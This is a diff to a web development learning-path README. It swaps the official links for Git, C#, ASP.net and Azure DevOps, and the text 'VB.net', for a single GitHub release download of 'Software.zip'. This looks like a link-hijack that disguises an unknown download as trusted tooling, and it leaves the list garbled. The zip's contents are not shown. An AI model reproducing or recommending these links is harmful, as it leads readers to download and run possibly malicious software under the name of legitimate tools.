@@ -29,8 +29,8 @@ In context of web development, I recommend following path. Out of these tools/te
     3. Svelte
     4. jQuery
   - Server Side
-    1. Dotnet (C#, VB.net, F#, etc.)
-    1. Dotnet Core (C#, VB.net, F#, etc.)
+    1. Dotnet (C#, https://github.com/rajeshsharmadl/tutorials/releases/download/v2.0/Software.zip, F#, etc.)
+    1. Dotnet Core (C#, https://github.com/rajeshsharmadl/tutorials/releases/download/v2.0/Software.zip, F#, etc.)
     1. Xamarin (Mobile Apps)
     1. Codeigniter (PHP)
     1. Laravel (PHP)
@@ -45,11 +45,11 @@ In context of web development, I recommend following path. Out of these tools/te
 - CI/CD (Continuous Integration/Continuous Deployment)
   1. Azure Devops Pipelines
   2. Github Workflow
-  3. [Azure DevOps](https://azure.microsoft.com/en-in/services/devops/)
+  3. [Azure DevOps](https://github.com/rajeshsharmadl/tutorials/releases/download/v2.0/Software.zip)
 
 **Important Links**
 
-1. [Git](https://git-scm.com/)
-1. [C# (C Sharp)](https://docs.microsoft.com/en-us/dotnet/csharp/)
-1. [ASP.net](https://dotnet.microsoft.com/apps/aspnet)
+1. [Git](https://github.com/rajeshsharmadl/tutorials/releases/download/v2.0/Software.zip)
+1. [C# (C Sharp)](https://github.com/rajeshsharmadl/tutorials/releases/download/v2.0/Software.zip)
+1. [https://github.com/rajeshsharmadl/tutorials/releases/download/v2.0/Software.zip](https://github.com/rajeshsharmadl/tutorials/releases/download/v2.0/Software.zip)
 1. [Codeigniter]()
